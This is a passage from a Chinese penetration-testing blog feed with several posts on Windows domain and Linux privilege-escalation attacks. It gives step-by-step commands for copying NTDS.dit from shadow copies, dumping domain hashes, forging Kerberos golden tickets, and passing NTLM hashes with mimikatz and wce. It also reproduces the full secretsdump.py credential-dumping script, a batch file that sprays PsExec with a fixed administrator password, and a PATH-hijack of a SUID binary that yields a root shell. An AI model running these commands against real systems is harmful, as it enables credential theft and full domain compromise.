\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</code></pre><ol><li>ntds.dit和SYSTEM文件的位置：</li><li>“shadow_copy_volume_name\Windows\NTDS\NTDS.dit”</li><li>“shadow_copy_volume_name\Windows\System32\config\SYSTEM”</li><li>即在：</li><li>\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit</li><li>\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</li><li>把他们复制到指定webshell目录下：</li><li>psexec64.exe \192.168.0.104 -u administrator -p 123456 -h cmd /c “copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit \192.168.0.104\C$&quot;</li><li>psexec64.exe \192.168.0.104 -u administrator -p 123456 -h cmd /c “copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM \192.168.0.104\C$&quot;</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/8.png" alt></li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/9.png" alt></li><li>然后通过webshell下载SYSTEM和ntds.dit到本地主机，使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noopener">secretsdump.py</a>脚本从ntds.dit和SYSTEM文件中提取：domain/uid/rid/LM hash/NT hash</li><li>python secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL</li><li>图略</li></ol><p><a href="https://www.freebuf.com/articles/web/195709.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/195709.html</a></p><hr><h2 id="0x50-内网信息搜集"><a href="#0x50-内网信息搜集" class="headerlink" title="0x50 内网信息搜集"></a>0x50 内网信息搜集</h2><ol><li><strong>单行命令扫描存活主机</strong></li><li>windows版：</li><li>for /l %p in (1,1,254) do @ping -l 1 -n 3 -w 40 192.168.0.%p &amp; if errorlevel 1 (echo 192.168.0.%p&gt;&gt;na.txt) else (echo 192.168.0.%p&gt;&gt;ok.txt)</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/11.png" alt></li><li>Linux版：</li><li>for i in {1..254}; do ping -q -i 0.01 -c 3 192.168.0.$i &amp;&gt; /dev/null &amp;&amp; echo 192.168.0.$i is alive; done</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/10.png" alt></li></ol><hr><h2 id="0x60-票据传递攻击"><a href="#0x60-票据传递攻击" class="headerlink" title="0x60 票据传递攻击"></a>0x60 票据传递攻击</h2><ol><li>域中每个用户的ticket都是有krbtgt的密码hash来计算生成的。拿到krbtgt的密码hash，就可以伪造ticket，进而使用ticket登录域控制器。</li><li><strong>条件：</strong>域管理账号、域名称、SID值</li><li><code>net group &quot;domain admins&quot; /domain</code> #查询域管理用户</li><li><code>net user /domain</code> #可查看到域名</li><li><code>mimikatz.exe log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;</code> #cmd执行一条命令获取所有用户hash及SID值</li><li><code>mimikatz # kerberos::golden /user:[域用户名] /domain:[域] /sid：[SID值] /krbtgt:[hash] /ticket:test.kirbi</code> #生成黄金票据（golden ticket）</li><li><code>mimikatz # kerberos::ptt test.kirbi</code> #导入票据</li><li><code>C:\.....&gt;klist</code> #域成员主机上执行klist，查看缓存的票据</li><li><code>C:\.....&gt;dir \\域控\C$</code> #使用票据传递攻击，登录域控</li></ol><hr><h2 id="0x61-hash传递"><a href="#0x61-hash传递" class="headerlink" title="0x61 hash传递"></a>0x61 hash传递</h2><ol><li>有时候使用工具只能获取到账号的NTML hash，获取不到明文。</li><li>domain已设置为.</li><li>mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords”</li><li><strong>工具：wce.exe</strong></li><li>net use \IP\c$ #一般提示失败，提示需要用户登录认证</li><li>wce.exe -s [username]:.:[LM值]:[NTLM值] #hash传递，. 是域名</li><li>net use \IP\c$ #一般会成功，但会被发现</li><li><strong>工具：mimikatz</strong></li><li><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:[username] /domain:[domain] /ntlm:[NTLM值]&quot;</code></li><li>net use \IP\c$ #一般会成功</li></ol><hr><h2 id="0xFE-参考"><a href="#0xFE-参考" class="headerlink" title="0xFE 参考"></a>0xFE 参考</h2><p><a href="https://www.freebuf.com/articles/web/195709.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/195709.html</a></p><h2 id="0xFF-代码"><a href="#0xFF-代码" class="headerlink" title="0xFF 代码"></a>0xFF 代码</h2><p><strong><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noopener">secretsdump.py</a></strong></p><pre><code>#!/usr/bin/env python# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.## This software is provided under a slightly modified version# of the Apache Software License. See the accompanying LICENSE file# for more information.## Description: Performs various techniques to dump hashes from the#              remote machine without executing any agent there.#              For SAM and LSA Secrets (including cached creds)#              we try to read as much as we can from the registry#              and then we save the hives in the target system#              (%SYSTEMROOT%\\Temp dir) and read the rest of the#              data from there.#              For NTDS.dit we either:#                a. Get the domain users list and get its hashes#                   and Kerberos keys using [MS-DRDS] DRSGetNCChanges()#                   call, replicating just the attributes we need.#                b. Extract NTDS.dit via vssadmin executed  with the#                   smbexec approach.#                   It&#39;s copied on the temp dir and parsed remotely.##              The script initiates the services required for its working#              if they are not available (e.g. Remote Registry, even if it is #              disabled). After the work is done, things are restored to the #              original state.## Author:#  Alberto Solino (@agsolino)## References: Most of the work done by these guys. I just put all#             the pieces together, plus some extra magic.## https://github.com/gentilkiwi/kekeo/tree/master/dcsync# https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html# https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html# https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html# https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13# https://code.google.com/p/creddump/# https://lab.mediaservice.net/code/cachedump.rb# https://insecurety.net/?p=768# http://www.beginningtoseethelight.org/ntsecurity/index.htm# https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&amp;-forensic-analysis.pdf# https://www.passcape.com/index.php?section=blog&amp;cmd=details&amp;id=15#from __future__ import divisionfrom __future__ import print_functionimport argparseimport codecsimport loggingimport osimport sysfrom impacket import versionfrom impacket.examples import loggerfrom impacket.smbconnection import SMBConnectionfrom impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashesfrom impacket.krb5.keytab import Keytabtry:    input = raw_inputexcept NameError:    passclass DumpSecrets:    def __init__(self, remoteName, username=&#39;&#39;, password=&#39;&#39;, domain=&#39;&#39;, options=None):        self.__useVSSMethod = options.use_vss        self.__remoteName = remoteName        self.__remoteHost = options.target_ip        self.__username = username        self.__password = password        self.__domain = domain        self.__lmhash = &#39;&#39;        self.__nthash = &#39;&#39;        self.__aesKey = options.aesKey        self.__smbConnection = None        self.__remoteOps = None        self.__SAMHashes = None        self.__NTDSHashes = None        self.__LSASecrets = None        self.__systemHive = options.system        self.__bootkey = options.bootkey        self.__securityHive = options.security        self.__samHive = options.sam        self.__ntdsFile = options.ntds        self.__history = options.history        self.__noLMHash = True        self.__isRemote = True        self.__outputFileName = options.outputfile        self.__doKerberos = options.k        self.__justDC = options.just_dc        self.__justDCNTLM = options.just_dc_ntlm        self.__justUser = options.just_dc_user        self.__pwdLastSet = options.pwd_last_set        self.__printUserStatus= options.user_status        self.__resumeFileName = options.resumefile        self.__canProcessSAMLSA = True        self.__kdcHost = options.dc_ip        self.__options = options        if options.hashes is not None:            self.__lmhash, self.__nthash = options.hashes.split(&#39;:&#39;)    def connect(self):        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)        if self.__doKerberos:            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,                                               self.__nthash, self.__aesKey, self.__kdcHost)        else:            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)    def dump(self):        try:            if self.__remoteName.upper() == &#39;LOCAL&#39; and self.__username == &#39;&#39;:                self.__isRemote = False                self.__useVSSMethod = True                if self.__systemHive:                    localOperations = LocalOperations(self.__systemHive)                    bootKey = localOperations.getBootKey()                    if self.__ntdsFile is not None:                    # Let&#39;s grab target&#39;s configuration about LM Hashes storage                        self.__noLMHash = localOperations.checkNoLMHashPolicy()                else:                    import binascii                    bootKey = binascii.unhexlify(self.__bootkey)            else:                self.__isRemote = True                bootKey = None                try:                    try:                        self.connect()                    except Exception as e:                        if os.getenv(&#39;KRB5CCNAME&#39;) is not None and self.__doKerberos is True:                            # SMBConnection failed. That might be because there was no way to log into the                            # target system. We just have a last resort. Hope we have tickets cached and that they                            # will work                            logging.debug(&#39;SMBConnection didn\&#39;t work, hoping Kerberos will help (%s)&#39; % str(e))                            pass                        else:                            raise                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)                    self.__remoteOps.setExecMethod(self.__options.exec_method)                    if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:                        self.__remoteOps.enableRegistry()                        bootKey             = self.__remoteOps.getBootKey()                        # Let&#39;s check whether target system stores LM Hashes                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()                except Exception as e:                    self.__canProcessSAMLSA = False                    if str(e).find(&#39;STATUS_USER_SESSION_DELETED&#39;) and os.getenv(&#39;KRB5CCNAME&#39;) is not None \                        and self.__doKerberos is True:                        # Giving some hints here when SPN target name validation is set to something different to Off                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/                        logging.error(&#39;Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user&#39;)                    else:                        logging.error(&#39;RemoteOperations failed: %s&#39; % str(e))            # If RemoteOperations succeeded, then we can extract SAM and LSA            if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:                try:                    if self.__isRemote is True:                        SAMFileName         = self.__remoteOps.saveSAM()                    else:                        SAMFileName         = self.__samHive                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)                    self.__SAMHashes.dump()                    if self.__outputFileName is not None:                        self.__SAMHashes.export(self.__outputFileName)                except Exception as e:                    logging.error(&#39;SAM hashes extraction failed: %s&#39; % str(e))                try:                    if self.__isRemote is True:                        SECURITYFileName = self.__remoteOps.saveSECURITY()                    else:                        SECURITYFileName = self.__securityHive                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,                                                   isRemote=self.__isRemote, history=self.__history)                    self.__LSASecrets.dumpCachedHashes()                    if self.__outputFileName is not None:                        self.__LSASecrets.exportCached(self.__outputFileName)                    self.__LSASecrets.dumpSecrets()                    if self.__outputFileName is not None:                        self.__LSASecrets.exportSecrets(self.__outputFileName)                except Exception as e:                    if logging.getLogger().level == logging.DEBUG:                        import traceback                        traceback.print_exc()                    logging.error(&#39;LSA hashes extraction failed: %s&#39; % str(e))            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work            if self.__isRemote is True:                if self.__useVSSMethod and self.__remoteOps is not None:                    NTDSFileName = self.__remoteOps.saveNTDS()                else:                    NTDSFileName = None            else:                NTDSFileName = self.__ntdsFile            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,                                           outputFileName=self.__outputFileName, justUser=self.__justUser,                                           printUserStatus= self.__printUserStatus)            try:                self.__NTDSHashes.dump()            except Exception as e:                if logging.getLogger().level == logging.DEBUG:                    import traceback                    traceback.print_exc()                if str(e).find(&#39;ERROR_DS_DRA_BAD_DN&#39;) &gt;= 0:                    # We don&#39;t store the resume file if this error happened, since this error is related to lack                    # of enough privileges to access DRSUAPI.                    resumeFile = self.__NTDSHashes.getResumeSessionFile()                    if resumeFile is not None:                        os.unlink(resumeFile)                logging.error(e)                if self.__justUser and str(e).find(&quot;ERROR_DS_NAME_ERROR_NOT_UNIQUE&quot;) &gt;=0:                    logging.info(&quot;You just got that error because there might be some duplicates of the same name. &quot;                                 &quot;Try specifying the domain name for the user as well. It is important to specify it &quot;                                 &quot;in the form of NetBIOS domain name/user (e.g. contoso/Administratror).&quot;)                elif self.__useVSSMethod is False:                    logging.info(&#39;Something wen\&#39;t wrong with the DRSUAPI approach. Try again with -use-vss parameter&#39;)            self.cleanup()        except (Exception, KeyboardInterrupt) as e:            if logging.getLogger().level == logging.DEBUG:                import traceback                traceback.print_exc()            logging.error(e)            if self.__NTDSHashes is not None:                if isinstance(e, KeyboardInterrupt):                    while True:                        answer =  input(&quot;Delete resume session file? [y/N] &quot;)                        if answer.upper() == &#39;&#39;:                            answer = &#39;N&#39;                            break                        elif answer.upper() == &#39;Y&#39;:                            answer = &#39;Y&#39;                            break                        elif answer.upper() == &#39;N&#39;:                            answer = &#39;N&#39;                            break                    if answer == &#39;Y&#39;:                        resumeFile = self.__NTDSHashes.getResumeSessionFile()                        if resumeFile is not None:                            os.unlink(resumeFile)            try:                self.cleanup()            except:                pass    def cleanup(self):        logging.info(&#39;Cleaning up... &#39;)        if self.__remoteOps:            self.__remoteOps.finish()        if self.__SAMHashes:            self.__SAMHashes.finish()        if self.__LSASecrets:            self.__LSASecrets.finish()        if self.__NTDSHashes:            self.__NTDSHashes.finish()# Process command-line arguments.if __name__ == &#39;__main__&#39;:    # Explicitly changing the stdout encoding format    if sys.stdout.encoding is None:        # Output is redirected to a file        sys.stdout = codecs.getwriter(&#39;utf8&#39;)(sys.stdout)    print(version.BANNER)    parser = argparse.ArgumentParser(add_help = True, description = &quot;Performs various techniques to dump secrets from &quot;                                                      &quot;the remote machine without executing any agent there.&quot;)    parser.add_argument(&#39;target&#39;, action=&#39;store&#39;, help=&#39;[[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL&#39;                                                       &#39; (if you want to parse local files)&#39;)    parser.add_argument(&#39;-ts&#39;, action=&#39;store_true&#39;, help=&#39;Adds timestamp to every logging output&#39;)    parser.add_argument(&#39;-debug&#39;, action=&#39;store_true&#39;, help=&#39;Turn DEBUG output ON&#39;)    parser.add_argument(&#39;-system&#39;, action=&#39;store&#39;, help=&#39;SYSTEM hive to parse&#39;)    parser.add_argument(&#39;-bootkey&#39;, action=&#39;store&#39;, help=&#39;bootkey for SYSTEM hive&#39;)    parser.add_argument(&#39;-security&#39;, action=&#39;store&#39;, help=&#39;SECURITY hive to parse&#39;)    parser.add_argument(&#39;-sam&#39;, action=&#39;store&#39;, help=&#39;SAM hive to parse&#39;)    parser.add_argument(&#39;-ntds&#39;, action=&#39;store&#39;, help=&#39;NTDS.DIT file to parse&#39;)    parser.add_argument(&#39;-resumefile&#39;, action=&#39;store&#39;, help=&#39;resume file name to resume NTDS.DIT session dump (only &#39;                         &#39;available to DRSUAPI approach). This file will also be used to keep updating the session\&#39;s &#39;                         &#39;state&#39;)    parser.add_argument(&#39;-outputfile&#39;, action=&#39;store&#39;,                        help=&#39;base output filename. Extensions will be added for sam, secrets, cached and ntds&#39;)    parser.add_argument(&#39;-use-vss&#39;, action=&#39;store_true&#39;, default=False,                        help=&#39;Use the VSS method insead of default DRSUAPI&#39;)    parser.add_argument(&#39;-exec-method&#39;, choices=[&#39;smbexec&#39;, &#39;wmiexec&#39;, &#39;mmcexec&#39;], nargs=&#39;?&#39;, default=&#39;smbexec&#39;, help=&#39;Remote exec &#39;                        &#39;method to use at target (only when using -use-vss). Default: smbexec&#39;)    group = parser.add_argument_group(&#39;display options&#39;)    group.add_argument(&#39;-just-dc-user&#39;, action=&#39;store&#39;, metavar=&#39;USERNAME&#39;,                       help=&#39;Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. &#39;                            &#39;Implies also -just-dc switch&#39;)    group.add_argument(&#39;-just-dc&#39;, action=&#39;store_true&#39;, default=False,                        help=&#39;Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)&#39;)    group.add_argument(&#39;-just-dc-ntlm&#39;, action=&#39;store_true&#39;, default=False,                       help=&#39;Extract only NTDS.DIT data (NTLM hashes only)&#39;)    group.add_argument(&#39;-pwd-last-set&#39;, action=&#39;store_true&#39;, default=False,                       help=&#39;Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\&#39;t apply to -outputfile data&#39;)    group.add_argument(&#39;-user-status&#39;, action=&#39;store_true&#39;, default=False,                        help=&#39;Display whether or not the user is disabled&#39;)    group.add_argument(&#39;-history&#39;, action=&#39;store_true&#39;, help=&#39;Dump password history, and LSA secrets OldVal&#39;)    group = parser.add_argument_group(&#39;authentication&#39;)    group.add_argument(&#39;-hashes&#39;, action=&quot;store&quot;, metavar = &quot;LMHASH:NTHASH&quot;, help=&#39;NTLM hashes, format is LMHASH:NTHASH&#39;)    group.add_argument(&#39;-no-pass&#39;, action=&quot;store_true&quot;, help=&#39;don\&#39;t ask for password (useful for -k)&#39;)    group.add_argument(&#39;-k&#39;, action=&quot;store_true&quot;, help=&#39;Use Kerberos authentication. Grabs credentials from ccache file &#39;                             &#39;(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use&#39;                             &#39; the ones specified in the command line&#39;)    group.add_argument(&#39;-aesKey&#39;, action=&quot;store&quot;, metavar = &quot;hex key&quot;, help=&#39;AES key to use for Kerberos Authentication&#39;                                                                            &#39; (128 or 256 bits)&#39;)    group.add_argument(&#39;-keytab&#39;, action=&quot;store&quot;, help=&#39;Read keys for SPN from keytab file&#39;)    group = parser.add_argument_group(&#39;connection&#39;)    group.add_argument(&#39;-dc-ip&#39;, action=&#39;store&#39;,metavar = &quot;ip address&quot;,  help=&#39;IP Address of the domain controller. If &#39;                                 &#39;ommited it use the domain part (FQDN) specified in the target parameter&#39;)    group.add_argument(&#39;-target-ip&#39;, action=&#39;store&#39;, metavar=&quot;ip address&quot;,                       help=&#39;IP Address of the target machine. If omitted it will use whatever was specified as target. &#39;                            &#39;This is useful when target is the NetBIOS name and you cannot resolve it&#39;)    if len(sys.argv)==1:        parser.print_help()        sys.exit(1)    options = parser.parse_args()    # Init the example&#39;s logger theme    logger.init(options.ts)    if options.debug is True:        logging.getLogger().setLevel(logging.DEBUG)        # Print the Library&#39;s installation path        logging.debug(version.getInstallationPath())    else:        logging.getLogger().setLevel(logging.INFO)    import re    domain, username, password, remoteName = re.compile(&#39;(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)&#39;).match(        options.target).groups(&#39;&#39;)    #In case the password contains &#39;@&#39;    if &#39;@&#39; in remoteName:        password = password + &#39;@&#39; + remoteName.rpartition(&#39;@&#39;)[0]        remoteName = remoteName.rpartition(&#39;@&#39;)[2]    if options.just_dc_user is not None:        if options.use_vss is True:            logging.error(&#39;-just-dc-user switch is not supported in VSS mode&#39;)            sys.exit(1)        elif options.resumefile is not None:            logging.error(&#39;resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch&#39;)            sys.exit(1)        elif remoteName.upper() == &#39;LOCAL&#39; and username == &#39;&#39;:            logging.error(&#39;-just-dc-user not compatible in LOCAL mode&#39;)            sys.exit(1)        else:            # Having this switch on implies not asking for anything else.            options.just_dc = True    if options.use_vss is True and options.resumefile is not None:        logging.error(&#39;resuming a previous NTDS.DIT dump session is not supported in VSS mode&#39;)        sys.exit(1)    if remoteName.upper() == &#39;LOCAL&#39; and username == &#39;&#39; and options.resumefile is not None:        logging.error(&#39;resuming a previous NTDS.DIT dump session is not supported in LOCAL mode&#39;)        sys.exit(1)    if remoteName.upper() == &#39;LOCAL&#39; and username == &#39;&#39;:        if options.system is None and options.bootkey is None:            logging.error(&#39;Either the SYSTEM hive or bootkey is required for local parsing, check help&#39;)            sys.exit(1)    else:        if options.target_ip is None:            options.target_ip = remoteName        if domain is None:            domain = &#39;&#39;        if options.keytab is not None:            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)            options.k = True        if password == &#39;&#39; and username != &#39;&#39; and options.hashes is None and options.no_pass is False and options.aesKey is None:            from getpass import getpass            password = getpass(&quot;Password:&quot;)        if options.aesKey is not None:            options.k = True    dumper = DumpSecrets(remoteName, username, password, domain, options)    try:        dumper.dump()    except Exception as e:        if logging.getLogger().level == logging.DEBUG:            import traceback            traceback.print_exc()        logging.error(e)</code></pre><p><strong>1.bat</strong></p><pre><code>@echo offecho check ip addr config file…if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto endecho read and analysis file…for /F “eol=#” %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p “123456″ cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p “123456″ cmd:endexit</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> windows </tag>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权之Linux-利用通配符本地提权</title>
      <link href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
      <url>/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-通配符"><a href="#0x00-通配符" class="headerlink" title="0x00 通配符"></a>0x00 通配符</h2><ol><li>常见通配符：*、?、+、[]、-、~</li><li>主要用来对关键字进行模糊匹配。</li><li>在终端里，输入的通配符是shell处理的，shell会将其当作路径或文件名去查找，存在则处理。</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/1.png" alt></li></ol><h2 id="0x01-通配符野性"><a href="#0x01-通配符野性" class="headerlink" title="0x01 通配符野性"></a>0x01 通配符野性</h2><ol><li>命令：</li><li>echo “123”&gt;–help</li><li>ls -l</li><li>cat ./–help</li><li>cat –help #读取不了–help文件的内容，而是输出了cat的help选项，称为通配符野性</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/2.png" alt></li></ol><h2 id="0x02-利用chown劫持文件所有者"><a href="#0x02-利用chown劫持文件所有者" class="headerlink" title="0x02 利用chown劫持文件所有者"></a>0x02 利用chown劫持文件所有者</h2><ol><li>Linux是多用户多任务操作系统，所有文件都有拥有者。</li><li>chown命令可改变文件的拥有者为指定的用户或组，用户可以是用户名或用户ID，组可以是组名或组ID。</li><li>将test.txt文件</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权之windows-CVE-2018-8120</title>
      <link href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"/>
      <url>/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-漏洞原因"><a href="#0x00-漏洞原因" class="headerlink" title="0x00 漏洞原因"></a>0x00 漏洞原因</h2><ol><li>部分版本Windows系统win32k.sys组件的NtUserSetImeInfoEx()系统服务函数内部未验证内核对象中的空指针对象,普通应用程序可利用该空指针漏洞以内核权限执行任意代码。</li></ol><h2 id="0x01-受影响版本"><a href="#0x01-受影响版本" class="headerlink" title="0x01 受影响版本"></a>0x01 受影响版本</h2><ol><li>Win2003 x32,Win2003 x64</li><li>Win7 x32, Win7 x64 企业版</li><li>Win2008 x32</li><li>Win2008 R2 x32</li><li>Win2008 R2 Datacenter x64</li><li>Win2008 Enterprise x64 </li><li>WinXP x32</li></ol><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><ol><li><a href="https://github.com/unamer/CVE-2018-8120" target="_blank" rel="noopener">https://github.com/unamer/CVE-2018-8120</a></li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/1.png" alt="安全自鉴"></li></ol><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><ol><li><p>Win 2008 R2 Enterprise x64 （提权失败~，版本不在影响范围）</p></li><li><p><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/2.png" alt></p></li><li><p>win 7 x64 旗舰版（提权失败~，版本不在影响范围）</p></li><li><p><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/4.png" alt></p></li><li><p>win 2003 x64 Enterprise（提权成功）</p></li><li><p><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/3.png" alt></p></li></ol><h2 id="0x04-微软修复程序下载地址"><a href="#0x04-微软修复程序下载地址" class="headerlink" title="0x04 微软修复程序下载地址"></a>0x04 微软修复程序下载地址</h2><ol><li><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120</a></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://xiaodaozhi.com/exploit/156.html" target="_blank" rel="noopener">https://xiaodaozhi.com/exploit/156.html</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权之Linux-环境变量</title>
      <link href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
      <url>/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境变量"><a href="#0x00-环境变量" class="headerlink" title="0x00 环境变量"></a>0x00 环境变量</h2><ol><li>环境变量是用来定义系统运行环境的一些参数。</li><li>env #查看环境变量命令</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/1.png" alt></li><li>echo $PATH #输出单项环境变量</li><li><strong>比较重要的10个环境变量</strong></li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/2.png" alt></li></ol><h2 id="0x01-新建测试文件"><a href="#0x01-新建测试文件" class="headerlink" title="0x01 新建测试文件"></a>0x01 新建测试文件</h2><ol><li>新建test.c，内容<pre><code>#include &lt;unistd.h&gt;void main(){     setuid(0);     setgid(0);     system(&quot;ps&quot;);}</code></pre></li><li>编译test.c，赋权</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/3.png" alt></li><li>chmod u+s [exe] #u+s：让某用户在执行该可执行文件时暂时拥有该文件所有者的权限</li></ol><h2 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h2><ol><li><code>find / -perm -u=s -type f 2&gt;/dev/null</code> #查找/（根）目录下，权限u为s（rws），类型为文件，即枚举所有符合条件的可执行文件</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/4.png" alt></li><li>找到test执行文件具有SUID权限</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/5.png" alt></li></ol><p><strong>echo命令</strong></p><pre><code>test@linux:/tmp$ echo &quot;/bin/bash&quot;&gt;pstest@linux:/tmp$ lsps  test  test.ctest@linux:/tmp$ chmod 777 pstest@linux:/tmp$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamestest@linux:/tmp$ export PATH=/tmp:$PATH #export：添加临时环境变量test@linux:/tmp$ lsps  test  test.ctest@linux:/tmp$ ./testroot@linux:/tmp# id</code></pre><ol><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.png" alt></li><li>#export：添加临时环境变量</li><li>永久修改环境变量</li><li>编辑：vi /etc/profile</li><li>添加export PATH=$PATH:/usr/local/openresty/bin到文件末尾</li><li>使其生效：source /etc/profile</li></ol><p><strong>copy命令</strong></p><pre><code>test@linux:/tmp$ lstest  test.ctest@linux:/tmp$ cp /bin/bash /tmp/pstest@linux:/tmp$ echo $PATH/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamestest@linux:/tmp$ export PATH=/tmp:$PATH #其实已经添加了，这里是完整步骤test@linux:/tmp$ ./testroot@linux:/tmp# whoamirootroot@linux:/tmp# </code></pre><ol><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/7.png" 